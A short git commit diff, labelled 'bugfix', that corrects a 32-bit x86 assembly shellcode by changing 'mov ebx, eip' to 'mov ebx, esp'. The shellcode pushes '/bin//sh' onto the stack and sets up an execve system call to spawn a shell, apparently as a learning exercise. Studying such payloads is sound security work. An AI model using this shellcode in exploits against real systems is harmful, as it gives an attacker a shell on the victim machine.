4899735faaa907cdc840b09732ca4b29fab519db
Henry Huang <henryhuang726@gmail.com>
2020-05-16 23:27:49 -0400

    bugfix

--- shellcode/shellcode_32.asm
+++ shellcode/shellcode_32.asm
@@ -9,7 +9,7 @@ main:
 	push 0x68732f2f  ; use print /x "/bin//sh" in gdb to get values
 	push 0x6e69622f  ; "hs//" and "nib/"
 
-	mov ebx, eip	 ; move stack to ebx
+	mov ebx, esp	 ; move stack to ebx
 	xor ecx, ecx	 ; zero out ecx
 	xor edx, edx     ; zero out edx
 	mov al, 11		 ; load execve into lower byte of eax
